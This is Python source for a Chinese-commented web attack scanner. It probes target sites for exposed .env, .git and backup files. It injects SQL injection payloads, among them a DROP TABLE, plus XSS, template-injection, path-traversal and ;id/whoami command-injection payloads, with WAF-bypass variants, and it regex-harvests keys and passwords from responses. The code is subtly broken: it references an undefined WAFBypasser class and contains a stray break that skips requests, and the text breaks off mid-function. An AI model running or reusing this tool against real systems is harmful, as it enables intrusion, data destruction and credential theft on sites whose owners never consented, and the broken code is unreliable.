import subprocess
import sys

REQUIRED_PACKAGES = ["requests", "urllib3"]

def check_and_install_packages():
    missing = []
    for pkg in REQUIRED_PACKAGES:
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)
    if missing:
        print(f"检测到缺失依赖：{', '.join(missing)}，正在安装...")
        python = sys.executable
        for pkg in missing:
            try:
                subprocess.check_call([python, "-m", "pip", "install", "--user", pkg])
            except subprocess.CalledProcessError:
                print(f"安装失败：{pkg}，请手动 pip install {pkg}")
                sys.exit(1)

check_and_install_packages()

import requests
import re
import time
import os
import json
import logging
import random
import hashlib
from datetime import datetime
from typing import Optional, List, Dict, Any, Tuple, Set
from dataclasses import dataclass
from threading import Lock, Event
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


@dataclass
class ScanConfig:
    payload_interval: float = 2.0
    max_workers: int = 5
    request_timeout: int = 10
    max_retries: int = 2
    retry_delay: float = 1.0
    baseline_variance: int = 200
    min_confidence: float = 0.6
    max_memory_percent: float = 90.0
    memory_check_interval: int = 50
    response_truncate: int = 0
    checkpoint_file: str = "scan_checkpoint.json"
    enable_checkpoint: bool = True
    enable_prefilter: bool = True
    report_dir: str = "scan_reports"
    log_level: str = "INFO"
    log_file: str = ""
    target_url: str = ""
    poc_folder: str = ""
    module_dir: str = "modules"
    poc_repo_url: str = "https://github.com/helloclw/PocStore"
    enable_attack_surface: bool = True
    attack_surface_threads: int = 10
    max_attack_depth: int = 3
    probe_all_pages: bool = True

    @classmethod
    def from_file(cls, path: str = "scanner_config.json") -> "ScanConfig":
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            return cls(**{k: v for k, v in data.items() if k in cls.__dataclass_fields__})
        return cls()

    def save(self, path: str = "scanner_config.json"):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(self.__dict__, f, indent=2, ensure_ascii=False)


class ResponseAnalyzer:
    URL_PATTERNS = [
        r'(?:href|src|action)\s*=\s*["\'](/[^"\']*)["\']',
        r'(?:href|src|action)\s*=\s*["\']([^"\']*\?[^"\']*)["\']',
        r'["\'](/api/[^"\']*)["\']',
        r'["\'](/v\d+/[^"\']*)["\']',
        r'(?:fetch|axios|ajax)\s*\(\s*["\']([^"\']+)["\']',
        r'url\s*:\s*["\']([^"\']+)["\']',
        r'(?:GET|POST|PUT|DELETE)\s+(/\S+)',
    ]

    PARAM_PATTERNS = [
        r'name\s*=\s*["\'](\w+)["\']',
        r'<input[^>]*name=["\'](\w+)["\']',
        r'\?(\w+)=',
        r'&(\w+)=',
    ]

    SENSITIVE_PATTERNS = {
        "email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
        "internal_ip": r'(?:10\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}',
        "api_key": r'(?i)(?:api[_-]?key|apikey|secret|token|password)\s*[:=]\s*["\']?(\S{8,})',
        "path_disclosure": r'(?:C:\\|/home/|/var/|/usr/|/opt/|/etc/)\S+',
        "version": r'(?i)(?:version|ver|v)\s*[:=]\s*["\']?([\d.]+)',
        "stack_trace": r'(?:Traceback|Exception|Error|at\s+\w+\.\w+|in\s+\w+\.php)',
        "config": r'(?i)(?:database|db_host|db_name|db_user|db_pass|redis|mongo)\s*[:=]\s*\S+',
    }

    def __init__(self, base_url: str, logger: logging.Logger):
        self.base_url = base_url
        self.logger = logger
        self.discovered_urls: Set[str] = set()
        self.discovered_params: Set[str] = set()
        self.discovered_endpoints: Set[str] = set()
        self.sensitive_findings: List[Dict] = []

    def analyze(self, resp: requests.Response, source: str = "") -> Dict:
        text = resp.text
        url = str(resp.url)
        new_urls = set()
        new_params = set()
        new_endpoints = set()

        for pattern in self.URL_PATTERNS:
            for match in re.findall(pattern, text, re.IGNORECASE):
                path = match.strip()
                if path and not path.startswith(("http://", "https://", "#", "javascript:", "mailto:", "data:")):
                    if path.startswith("/"):
                        full_url = urljoin(self.base_url, path)
                        if full_url not in self.discovered_urls:
                            new_urls.add(full_url)
                            self.discovered_urls.add(full_url)
                elif path.startswith(("http://", "https://")):
                    if self._is_same_domain(path):
                        if path not in self.discovered_urls:
                            new_urls.add(path)
                            self.discovered_urls.add(path)

        for pattern in self.PARAM_PATTERNS:
            for match in re.findall(pattern, text, re.IGNORECASE):
                param = match.strip()
                if param and param not in ("csrf", "token", "_token", "authenticity_token",
                                            "submit", "button", "charset", "utf8"):
                    if param not in self.discovered_params:
                        new_params.add(param)
                        self.discovered_params.add(param)

        parsed = urlparse(url)
        qs_params = parse_qs(parsed.query)
        for p in qs_params:
            if p not in self.discovered_params:
                new_params.add(p)
                self.discovered_params.add(p)

        for path in new_urls:
            if any(kw in path.lower() for kw in ["/api/", "/v1/", "/v2/", "/v3/", "/graphql", "/rest/"]):
                if path not in self.discovered_endpoints:
                    new_endpoints.add(path)
                    self.discovered_endpoints.add(path)

        for info_type, pattern in self.SENSITIVE_PATTERNS.items():
            matches = re.findall(pattern, text)
            for match in matches[:3]:
                finding = {
                    "type": info_type,
                    "value": match[:100] if isinstance(match, str) else str(match)[:100],
                    "source_url": url,
                    "source_desc": source,
                }
                if not any(f["type"] == finding["type"] and f["value"] == finding["value"]
                          for f in self.sensitive_findings):
                    self.sensitive_findings.append(finding)

        result = {
            "new_urls": len(new_urls),
            "new_params": len(new_params),
            "new_endpoints": len(new_endpoints),
            "url_list": sorted(new_urls),
            "param_list": sorted(new_params),
            "endpoint_list": sorted(new_endpoints),
        }

        if new_urls or new_params or new_endpoints:
            self.logger.debug(f"响应分析：+{len(new_urls)}URL +{len(new_params)}参数 +{len(new_endpoints)}API [{source}]")

        return result

    def get_attack_surface(self) -> Dict:
        return {
            "urls": sorted(self.discovered_urls),
            "params": sorted(self.discovered_params),
            "endpoints": sorted(self.discovered_endpoints),
            "sensitive": self.sensitive_findings,
        }

    def _is_same_domain(self, url: str) -> bool:
        try:
            base_domain = urlparse(self.base_url).netloc.split(":")[0]
            target_domain = urlparse(url).netloc.split(":")[0]
            return base_domain == target_domain
        except Exception:
            return False


class AttackProber:
    PATH_PROBES = [
        ("/.env", "info_leak", "环境变量文件"),
        ("/.git/HEAD", "info_leak", "Git 仓库泄露"),
        ("/.git/config", "info_leak", "Git 配置泄露"),
        ("/robots.txt", "info_leak", "Robots 文件"),
        ("/sitemap.xml", "info_leak", "站点地图"),
        ("/phpinfo.php", "info_leak", "PHP 信息页"),
        ("/server-status", "info_leak", "Apache 状态页"),
        ("/admin", "admin_panel", "管理后台"),
        ("/admin/login", "admin_panel", "管理登录页"),
        ("/administrator", "admin_panel", "Joomla 后台"),
        ("/wp-login.php", "admin_panel", "WordPress 登录"),
        ("/wp-admin", "admin_panel", "WordPress 后台"),
        ("/manager/html", "admin_panel", "Tomcat 后台"),
        ("/api", "api_endpoint", "API 根"),
        ("/api/v1", "api_endpoint", "API v1"),
        ("/swagger.json", "api_endpoint", "Swagger 文档"),
        ("/api-docs", "api_endpoint", "API 文档"),
        ("/graphql", "api_endpoint", "GraphQL 端点"),
        ("/actuator", "actuator", "Spring Actuator"),
        ("/actuator/env", "actuator", "Actuator 环境变量"),
        ("/actuator/health", "actuator", "Actuator 健康检查"),
        ("/debug", "debug_endpoint", "调试端点"),
        ("/console", "debug_endpoint", "控制台"),
        ("/web.config", "config_file", "IIS 配置"),
        ("/.htaccess", "config_file", "Apache 配置"),
        ("/backup.sql", "backup_file", "数据库备份"),
        ("/dump.sql", "backup_file", "数据库转储"),
    ]

    PARAM_INJECTION_PAYLOADS = {
        "sql_injection": [
            "' OR '1'='1", "' OR 1=1--", "1' AND '1'='1", "admin'--",
            "1 UNION SELECT NULL--", "1; DROP TABLE users--",
        ],
        "xss": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>", "javascript:alert(1)",
        ],
        "ssti": [
            "{{7*7}}", "${7*7}", "#{7*7}", "{{config}}",
        ],
        "path_traversal": [
            "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
        ],
        "command_injection": [
            ";id", "|id", "`id`", "$(id)",
            "&whoami", "&&whoami",
        ],
    }

    ERROR_TRIGGER_PAYLOADS = [
        ("", "空请求体触发默认处理"),
        ("A" * 10000, "超长字符串触发缓冲区错误"),
        ("{{{{{{", "畸形模板语法"),
        ("'\"\\", "混合引号转义"),
        ("null", "null 值注入"),
        ("{}", "空对象"),
    ]

    def __init__(self, config: ScanConfig, session: requests.Session,
                 rate_limiter, logger: logging.Logger, analyzer: ResponseAnalyzer,
                 waf_bypasser: WAFBypasser = None):
        self.config = config
        self.session = session
        self.rate_limiter = rate_limiter
        self.logger = logger
        self.analyzer = analyzer
        self.waf_bypasser = waf_bypasser
        self.probe_results: List[Dict] = []

    def probe_paths(self) -> List[Dict]:
        self.logger.info("攻击探测 [1/3] 路径探测...")
        found = []

        for path, vuln_type, description in self.PATH_PROBES:
            target_url = urljoin(self.config.target_url, path)

            if not self.rate_limiter.acquire(timeout=30):
                continue

            try:
                resp = self.session.get(target_url, timeout=self.config.request_timeout,
                                       allow_redirects=False, verify=False)
            except Exception:
                continue

            if resp.status_code not in (404, 0):
                result = {
                    "path": path,
                    "url": target_url,
                    "status_code": resp.status_code,
                    "vuln_type": vuln_type,
                    "description": description,
                    "content_length": len(resp.text),
                }

                analysis = self.analyzer.analyze(resp, source=f"probe:{path}")
                result["discovered"] = analysis

                if vuln_type == "actuator" and resp.status_code == 200:
                    result["severity"] = "high"
                    result["reason"] = "Spring Actuator 暴露"
                elif vuln_type == "info_leak" and resp.status_code == 200:
                    result["severity"] = "medium"
                    result["reason"] = f"信息泄露：{description}"
                elif vuln_type == "admin_panel" and resp.status_code in (200, 301, 302):
                    result["severity"] = "medium"
                    result["reason"] = f"管理入口：{description}"
                else:
                    result["severity"] = "low"
                    result["reason"] = f"路径存在 ({resp.status_code})"

                found.append(result)
                self.probe_results.append(result)

                if result.get("severity") in ("high", "medium"):
                    self.logger.info(f"  探测发现：[{result['severity']}] {path} → {result['reason']}")

        self.logger.info(f"路径探测完成：{len(found)}/{len(self.PATH_PROBES)} 路径存在")
        return found

    def probe_params(self, discovered_params: Set[str] = None) -> List[Dict]:
        self.logger.info("攻击探测 [2/3] 参数注入探测 (WAF 绕过)...")

        params_to_test = set(discovered_params or [])
        common_params = {"id", "page", "q", "search", "query", "keyword", "name",
                        "user", "username", "email", "file", "path", "dir",
                        "url", "redirect", "return", "next", "callback",
                        "sort", "order", "type", "action"}
        params_to_test.update(common_params)

        base_url = self.config.target_url
        test_urls = [base_url]

        for url in list(self.analyzer.discovered_urls)[:20]:
            if "?" in url:
                test_urls.append(url)

        found = []
        total_probes = 0

        for test_url in test_urls[:5]:
            for param in sorted(params_to_test)[:15]:
                for vuln_type, payloads in self.PARAM_INJECTION_PAYLOADS.items():
                    for payload in payloads[:2]:
                        total_probes += 1

                        if not self.rate_limiter.acquire(timeout=30):
                            continue

                        bypass_variants = []
                        if self.waf_bypasser:
                            bypass_variants = self.waf_bypasser.generate_bypass_variants(payload, vuln_type)
                        else:
                            bypass_variants = [{"payload": payload, "technique": "original", "type": vuln_type}]

                        for variant in bypass_variants[:5]:
                            test_payload = variant["payload"]
                            technique = variant["technique"]

                            parsed = urlparse(test_url)
                            qs = parse_qs(parsed.query)
                            qs[param] = [test_payload]
                            new_query = urlencode({k: v[0] if isinstance(v, list) else v
                                                 for k, v in qs.items()})
                            inject_url = urlunparse(parsed._replace(query=new_query))

                            try:
                                headers = {}
                                if self.waf_bypasser and technique != "original":
                                    for header_mod in self.waf_bypasser.HEADER_BYPASS[:3]:
                                        headers.update(header_mod)
                                    break

                                resp = self.session.get(inject_url,
                                                       timeout=self.config.request_timeout,
                                                       allow_redirects=True,
                                                       verify=False,
                                                       headers=headers if headers else None)
                            except Exception:
                                continue

                            if resp is None:
                                continue

                            analysis = self.analyzer.analyze(resp, source=f"inject:{param}")

                            is_vuln, confidence, reason = self._quick_verify(
                                resp, test_payload, vuln_type, param)

                            if is_vuln:
                                result = {
                                    "url": inject_url,
                                    "param": param,
                                    "payload": test_payload[:80],
                                    "vuln_type": vuln_type,
                                    "status_code": resp.status_code,
                                    "confidence": confidence,
                                    "reason": reason,
                                    "waf_technique": technique,
                                    "vuln": True,
                                    "severity": "high" if vuln_type in ("sql_injection", "command_injection") else "medium",
                                }
                                found.append(result)
                                self.probe_results.append(result)

                                if self.waf_bypasser and technique != "original":
                                    self.waf_bypasser.record_success(technique)

                                self.logger.info(f"  注入发现：[{vuln_type}] {param}={test_payload[:30]} → {reason} (WAF: {technique})")
                                break

        self.logger.info(f"参数探测完成：{total_probes} 次 | 发现 {len(found)} 个漏洞")
        return found

    def probe_errors(self) -> List[Dict]:
        self.logger.info("攻击探测 [3/3] 错误触发探测...")
        found = []

        test_urls = [self.config.target_url]
        for ep in list(self.analyzer.discovered_endpoints)[:5]:
            test_urls.append(ep)
        for url in list(self.analyzer.discovered_urls)[:5]:
            test_urls.append(url)

        for test_url in test_urls[:5]:
            for payload, description in self.ERROR_TRIGGER_PAYLOADS:
                if not self.rate_limiter.acquire(timeout=30):
                    continue

                for method in ["GET", "POST"]:
                    try:
                        if method == "GET":
                            parsed = urlparse(test_url)
                            inject_url = urlunparse(parsed._replace(query=f"input={payload}"))
                            resp = self.session.get(inject_url,
                                                   timeout=self.config.request_timeout,
                                                   allow_redirects=False,
                                                   verify=False)
                        else:
                            resp = self.session.post(test_url,
                                                    data={"input": payload, "data": payload},
                                                    timeout=self.config.request_timeout,
                                                    allow_redirects=False,
                                                    verify=False)
                    except Exception:
                        continue

                    if resp is None:
                        continue

                    analysis = self.analyzer.analyze(resp, source=f"error_trigger:{description}")

                    text = resp.text
                    error_info = self._extract_error_info(text, resp.status_code)

                    if error_info:
                        result = {
                            "url": test_url,
                            "method": method,
                            "payload": payload[:50],
                            "status_code": resp.status_code,
                            "error_info": error_info,
                            "description": description,
                        }
                        found.append(result)

        self.logger.info(f"错误探测完成：发现 {len(found)} 条错误信息")
        return found

    def _quick_verify(self, resp, payload, vuln_type, param) -> Tuple[bool, float, str]:
        if resp.status_code == 0:
            return False, 0.0, "无响应"

        text = resp.text

        if vuln_type == "sql_injection":
            sql_signs = ["sql syntax", "mysql_", "ORA-", "PostgreSQL",
                        "SQLSTATE", "Unclosed quotation mark"]
            for sign in sql_signs:
                if sign.lower() in text.lower():
                    return True, 0.8, f"SQL 错误回显：{sign}"
            if resp.status_code == 500 and any(kw in text.lower() for kw in ["sql", "query", "database"]):
                return True, 0.6, "SQL 触发 500"

        elif vuln_type == "xss":
            if payload in text and ("<" in payload):
                return True, 0.85, "XSS Payload 回显"
            if "alert(1)" in text:
                return True, 0.9, "XSS 执行确认"

        elif vuln_type == "ssti":
            if "49" in text and "7*7" in payload:
                return True, 0.9, "SSTI 表达式执行 (7*7=49)"

        elif vuln_type == "path_traversal":
            if "root:" in text and ":x:" in text:
                return True, 0.95, "/etc/passwd 读取成功"

        elif vuln_type == "command_injection":
            if re.search(r"uid=\d+\(", text):
                return True, 0.95, "命令执行 (id)"

        return False, 0.0, "无特征"

    def _extract_error_info(self, text: str, status_code: int) -> Dict:
        info = {}

        if status_code not in (500, 400, 403, 401, 502, 503):
            return info

        stack_signs = {
            "php": ["PHP", "Fatal error", "Warning:", "Parse error"],
            "java": ["java.lang.", "javax.", "Exception", "Tomcat", "Spring"],
            "python": ["Traceback", "Django", "Flask", "ModuleNotFoundError"],
            "node": ["TypeError", "ReferenceError", "Cannot read property"],
            "asp": ["Server Error", "ASP.NET", "Web.config", "IIS"],
        }

        for stack, signs in stack_signs.items():
            for sign in signs:
                if sign in text:
                    info.setdefault("tech_stack", []).append(stack)
                    break

        paths = re.findall(r'(?:at |in |file )["\']?([/\w\\]+\.\w+)["\']?', text)
        if paths:
            info["file_paths"] = list(set(paths))[:5]

        return info


class ModuleManager:
    def __init__(self, module_dir, logger):
        self.module_dir, self.logger = module_dir, logger
        self.payloads, self.verifiers, self.profiles = [], [], []
        self._load_all()

    def _ensure_dirs(self):
        for sub in ["payloads", "verifiers", "profiles"]:
            os.makedirs(os.path.join(self.module_dir, sub), exist_ok=True)

    def _load_all(self):
        self._ensure_dirs()
        self.payloads = self._load_folder("payloads")
        self.verifiers = self._load_folder("verifiers")
        self.profiles = self._load_folder("profiles")

    def _load_folder(self, sub):
        folder = os.path.join(self.module_dir, sub)
        items = []
        for f in os.listdir(folder):
            if f.endswith(".json"):
                try:
                    with open(os.path.join(folder, f), "r", encoding="utf-8") as fp:
                        items.append(json.load(fp))
                except Exception:
                    pass
        return items

    def _save_module(self, category, name, data):
        folder = os.path.join(self.module_dir, category)
        os.makedirs(folder, exist_ok=True)
        safe_name = re.sub(r'[^\w\u4e00-\u9fff]', '_', name)
        with open(os.path.join(folder, f"{safe_name}.json"), "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

    def _remove_file(self, category, name):
        folder = os.path.join(self.module_dir, category)
        safe_name = re.sub(r'[^\w\u4e00-\u9fff]', '_', name)
        path = os.path.join(folder, f"{safe_name}.json")
        if os.path.exists(path):
            os.remove(path)
            return True
        return False

    def execute(self, cmd):
        cmd = cmd.strip()
        if not cmd:
            return ""
        parts = cmd.split()
        action = parts[0].lower()
        if action == "help":
            return self._help()
        elif action == "list":
            return self._cmd_list(parts[1:] if len(parts) > 1 else [])
        elif action == "payload":
            return self._cmd_payload(parts[1:])
        elif action == "verify":
            return self._cmd_verify(parts[1:])
        elif action == "profile":
            return self._cmd_profile(parts[1:])
        elif action == "remove":
            return self._cmd_remove(parts[1:])
        return f"未知命令：{action}"

    def _parse_flags(self, args):
        flags, positional = {}, []
        i = 0
        while i < len(args):
            if args[i].startswith("--"):
                key = args[i][2:]
                if i + 1 < len(args) and not args[i+1].startswith("--"):
                    flags[key] = args[i+1]; i += 2
                else:
                    flags[key] = True; i += 1
            else:
                positional.append(args[i]); i += 1
        return flags, positional

    def _cmd_payload(self, args):
        if not args or args[0].lower() != "add":
            return "用法：payload add <名称> <路径，,...> [--type 类型] [--must 词] [--ban 词]"
        flags, pos = self._parse_flags(args[1:])
        if len(pos) < 2:
            return "缺少参数"
        name, paths = pos[0], [p.strip() for p in pos[1].split(",") if p.strip()]
        module = {"name": name, "type": flags.get("type","custom"), "payloads": paths,
                  "verify": {"status_code": [200],
                             "must_contain": [k.strip() for k in flags.get("must","").split(",") if k.strip()],
                             "must_not_contain": [k.strip() for k in flags.get("ban","").split(",") if k.strip()]},
                  "created": datetime.now().isoformat()}
        self.payloads.append(module)
        self._save_module("payloads", name, module)
        return f"已添加 payload [{name}]"

    def _cmd_verify(self, args):
        if not args or args[0].lower() != "add":
            return "用法：verify add <名称> <正则> [--level high/medium] [--confidence 0.8] [--fp 词]"
        flags, pos = self._parse_flags(args[1:])
        if len(pos) < 2:
            return "缺少参数"
        name, pattern = pos[0], pos[1]
        try: confidence = float(flags.get("confidence", "0.7"))
        except ValueError: confidence = 0.7
        module = {"name": name, "level": flags.get("level","medium"), "pattern": pattern,
                  "confidence": confidence,
                  "false_positive_filter": [k.strip() for k in flags.get("fp","").split(",") if k.strip()],
                  "created": datetime.now().isoformat()}
        self.verifiers.append(module)
        self._save_module("verifiers", name, module)
        return f"已添加 verify [{name}]"

    def _cmd_profile(self, args):
        if not args or args[0].lower() != "add":
            return "用法：profile add <名称> [--title 词] [--header 词] [--skip 标签] [--prior 标签]"
        flags, pos = self._parse_flags(args[1:])
        if len(pos) < 1:
            return "缺少参数"
        name = pos[0]
        module = {"name": name, "fingerprint": {
                    "title_contains": [k.strip() for k in flags.get("title","").split(",") if k.strip()],
                    "header_contains": [k.strip() for k in flags.get("header","").split(",") if k.strip()]},
                  "skip_poc_tags": [k.strip() for k in flags.get("skip","").split(",") if k.strip()],
                  "priority_poc_tags": [k.strip() for k in flags.get("prior","").split(",") if k.strip()],
                  "created": datetime.now().isoformat()}
        self.profiles.append(module)
        self._save_module("profiles", name, module)
        return f"已添加 profile [{name}]"

    def _cmd_list(self, category):
        cat = category[0].lower() if category else "all"
        lines = []
        if cat in ("all","payloads"):
            lines.append(f"Payloads ({len(self.payloads)}):")
            for m in self.payloads: lines.append(f"  * {m['name']} | {m.get('type','?')}")
        if cat in ("all","verifiers"):
            lines.append(f"Verifiers ({len(self.verifiers)}):")
            for m in self.verifiers: lines.append(f"  * {m['name']} | {m.get('level','?')}")
        if cat in ("all","profiles"):
            lines.append(f"Profiles ({len(self.profiles)}):")
            for m in self.profiles: lines.append(f"  * {m['name']}")
        return "\n".join(lines) if lines else "模块库为空"

    def _cmd_remove(self, args):
        if len(args) < 2: return "用法：remove <payload|verify|profile> <名称>"
        cat, name = args[0].lower(), args[1]
        cat_map = {"payload":"payloads","verify":"verifiers","profile":"profiles"}
        if cat not in cat_map: return f"类别错误：{cat}"
        target = getattr(self, cat_map[cat])
        before = len(target)
        target[:] = [m for m in target if m.get("name") != name]
        self._remove_file(cat_map[cat], name)
        return f"已删除 {cat} [{name}]" if len(target) < before else f"未找到 {cat} [{name}]"

    def _help(self):
        return """
POC Scanner v2.5 命令
======================

模块管理:
  payload add <名称> <路径，,...> [--type 类型] [--must 词] [--ban 词]
  verify add <名称> <正则> [--level high/medium] [--confidence 0.8] [--fp 词]
  profile add <名称> [--title 词] [--header 词] [--skip 标签] [--prior 标签]
  list [payloads|verifiers|profiles]
  remove <payload|verify|profile> <名称>

扫描模式:
  scan               标准扫描（POC 逐个测试）
  attack             攻击即探测模式（先打过去，从响应中挖攻击面，再深入打）
  targets <文件>     加载批量目标
  report             查看历史报告
  config             查看配置
  help               帮助
  exit               退出

attack 模式 = 攻击探测 (3 阶段) + 响应分析 + 自适应 Payload + POC 验证
  阶段 1: 路径探测（40+ 敏感路径批量打）
  阶段 2: 参数注入（发现参数上注入各类 Payload）
  阶段 3: 错误触发（畸形请求触发技术栈信息泄露）
  然后进入标准 POC 扫描，但带着发现的攻击面做更精准的测试
""".strip()


class RateLimiter:
    def __init__(self, interval=2.0):
        self.interval = interval; self._last_time = 0.0; self._lock = Lock(); self._request_count = 0
    def acquire(self, timeout=60.0):
        deadline = time.time() + timeout
        while True:
            with self._lock:
                now = time.time()
                if now - self._last_time >= self.interval:
                    self._last_time = now; self._request_count += 1; return True
                wait_time = self.interval - (now - self._last_time)
            if time.time() + wait_time > deadline: return False
            time.sleep(min(wait_time, 0.1))
    @property
    def request_count(self): return self._request_count


def setup_logger(name, level="INFO", log_file=None):
    logger = logging.getLogger(name)
    logger.setLevel(getattr(logging, level.upper(), logging.INFO))
    if logger.handlers: return logger
    fmt = logging.Formatter("[%(asctime)s] [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
    ch = logging.StreamHandler(); ch.setFormatter(fmt); logger.addHandler(ch)
    if log_file:
        fh = logging.FileHandler(log_file, encoding="utf-8"); fh.setFormatter(fmt); logger.addHandler(fh)
    return logger


class FingerprintEngine:
    def __init__(self, config, session, logger):
        self.config, self.session, self.logger = config, session, logger; self.baseline = {}
    def identify(self, url):
        try:
            resp = self.session.get(url, timeout=self.config.request_timeout, allow_redirects=True)
            self.baseline = {"url": url, "status_code": resp.status_code,
                "content_length": len(resp.text), "content_hash": hashlib.md5(resp.text.encode()).hexdigest()[:16],
                "server": resp.headers.get("Server",""), "x_powered_by": resp.headers.get("X-Powered-By",""),
                "title": re.search(r"<title>(.*?)</title>", resp.text, re.IGNORECASE).group(1).strip() if re.search(r"<title>(.*?)</title>", resp.text, re.IGNORECASE) else "",
                "cookies": dict(resp.cookies)}
            return self.baseline
        except Exception as e:
            return {"error": str(e)}
    def get_headers(self):
        uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Firefox/121.0"]
        headers = {"User-Agent": random.choice(uas), "Accept": "text/html,application/xhtml+xml,*/*",
                   "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "keep-alive"}
        if self.baseline.get("cookies"):
            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.baseline["cookies"].items())
        return headers


class VulnVerifier:
    BUILTIN_CRITICAL = [
        (r"root:[:x:]", "linux_passwd_leak", 0.9), (r"uid=\d+\([^)]+\)\s+gid=\d+", "command_execution", 0.95),
        (r"mysql_fetch_array|sql syntax.*?mysql|ORA-\d{5}", "sql_error_leak", 0.8),
        (r"/bin/(?:bash|sh|dash)", "shell_path_leak", 0.85), (r"ConnectionStrings|AppSettings", "config_leak", 0.85)]
    BUILTIN_MEDIUM = [(r"warning.*?mysql|warning.*?sql", "sql_warning", 0.5), (r"<script>alert\(", "xss_reflected", 0.7)]
    def __init__(self, config, baseline, logger, modules):
        self.config, self.baseline, self.logger, self.modules = config, baseline, logger, modules
    def verify(self, resp, payload, poc_name, custom_rule=None):
        if custom_rule:
            r = self._verify_custom(resp, custom_rule)
            if r[0]: return r
        if resp.status_code != 200:
            if resp.status_code == 500 and any(kw in poc_name.lower() for kw in ["sql","inject"]):
                if any(kw in resp.text.lower() for kw in ["sql","mysql","syntax"]): return True, 0.6, "SQL 触发 500"
            return False, 0.0, f"状态码 {resp.status_code}"
        if self._matches_baseline(resp): return False, 0.0, "与基线一致"
        for pat, vt, conf in self.BUILTIN_CRITICAL:
            if re.search(pat, resp.text, re.IGNORECASE): return True, conf, f"高危：{vt}"
        hits = []
        for pat, vt, conf in self.BUILTIN_MEDIUM:
            if re.search(pat, resp.text, re.IGNORECASE): hits.append((vt, conf))
        for m in self.modules.verifiers:
            try:
                if re.search(m["pattern"], resp.text, re.IGNORECASE):
                    level, conf = m.get("level","medium"), m.get("confidence",0.6)
                    if any(fp in resp.text for fp in m.get("false_positive_filter",[])): continue
                    if level == "high": return True, conf, f"自定义：{m['name']}"
                    hits.append((f"custom:{m['name']}", conf))
            except Exception: pass
        if payload and payload in resp.text: hits.append(("payload_echo", 0.7))
        if hits:
            best = max(hits, key=lambda x: x[1])
            total = min(best[1] + 0.1 * (len(hits)-1), 1.0)
            if total >= self.config.min_confidence: return True, total, f"多信号：{', '.join(h[0] for h in hits)}"
        return False, 0.0, "无特征"
    def _verify_custom(self, resp, rule):
        if resp.status_code not in rule.get("status_code",[200]): return False, 0.0, f"状态码 {resp.status_code}"
        must = rule.get("must_contain",[])
        if must and not all(kw.lower() in resp.text.lower() for kw in must): return False, 0.0, "缺少必含"
        ban = rule.get("must_not_contain",[])
        if ban and any(kw.lower() in resp.text.lower() for kw in ban): return False, 0.0, "包含禁含"
        return True, 0.85, "自定义验证通过"
    def _matches_baseline(self, resp):
        bl, v = self.baseline, self.config.baseline_variance
        if abs(len(resp.text) - bl.get("content_length",0)) < v:
            if hashlib.md5(resp.text.encode()).hexdigest()[:16] == bl.get("content_hash"): return True
        return False


class POCPrefilter:
    PLATFORM_RULES = {"windows":["iis","asp","aspx"],"linux":["apache","nginx","php"],"java":["tomcat","spring","shiro"],"node":["express"],"python":["django","flask"]}
    FP_MAP = {"server":{"iis":"windows","apache":"linux","nginx":"linux","tomcat":"java"},"x_powered_by":{"asp.net":"windows","php":"linux"}}
    def __init__(self, logger, modules): self.logger, self.modules, self.target_tags = logger, modules, set()
    def build_profile(self, fp):
        self.target_tags = set()
        for fk, mp in self.FP_MAP.items():
            v = fp.get(fk,"").lower()
            for kw, tag in mp.items():
                if kw in v: self.target_tags.add(tag)
        return self.target_tags
    def should_scan(self, name, content):
        if not self.target_tags: return True, ""
        text = (name + " " + content).lower()
        pp = set()
        for p, kws in self.PLATFORM_RULES.items():
            if any(kw in text for kw in kws): pp.add(p)
        if not pp: return True, ""
        mm = pp - self.target_tags
        if mm and pp - mm == set(): return False, f"平台不匹配"
        return True, ""


class CheckpointManager:
    def __init__(self, config, logger): self.config, self.logger, self._completed = config, logger, set()
    def load(self):
        if not self.config.enable_checkpoint or not os.path.exists(self.config.checkpoint_file): return set()
        try:
            with open(self.config.checkpoint_file,"r",encoding="utf-8") as f: self._completed = set(json.load(f).get("completed",[]))
            return self._completed
        except: return set()
    def save_one(self, n):
        if not self.config.enable_checkpoint: return
        self._completed.add(n)
        try:
            with open(self.config.checkpoint_file,"w",encoding="utf-8") as f: json.dump({"completed":list(self._completed)},f,ensure_ascii=False)
        except: pass
    def clear(self):
        if os.path.exists(self.config.checkpoint_file): os.remove(self.config.checkpoint_file)
    def is_completed(self, n): return n in self._completed


class RequestEngine:
    def __init__(self, config, rl, session, logger):
        self.config, self.rate_limiter, self.session, self.logger = config, rl, session, logger
        self._stats = {"total":0,"success":0,"failed":0}
    def send(self, method, url, headers=None, body="", timeout=None):
        timeout = timeout or self.config.request_timeout
        if not self.rate_limiter.acquire(timeout=60): return None
        self._stats["total"] += 1
        for attempt in range(self.config.max_retries + 1):
            try:
                kwargs = {"timeout":timeout,"allow_redirects":True,"verify":False}
                if headers: kwargs["headers"] = headers
                m = method.upper()
                if m == "GET": resp = self.session.get(url, **kwargs)
                elif m == "POST": resp = self.session.post(url, data=body, **kwargs)
                elif m == "PUT": resp = self.session.put(url, data=body, **kwargs)
                elif m == "DELETE": resp = self.session.delete(url, **kwargs)
                else: return None
                self._stats["success"] += 1
                if self.config.response_truncate > 0 and len(resp.text) > self.config.response_truncate:
                    resp._content = resp.text[:self.config.response_truncate].encode()
                return resp
            except requests.exceptions.Timeout:
                if attempt < self.config.max_retries: time.sleep(self.config.retry_delay)
            except requests.exceptions.ConnectionError:
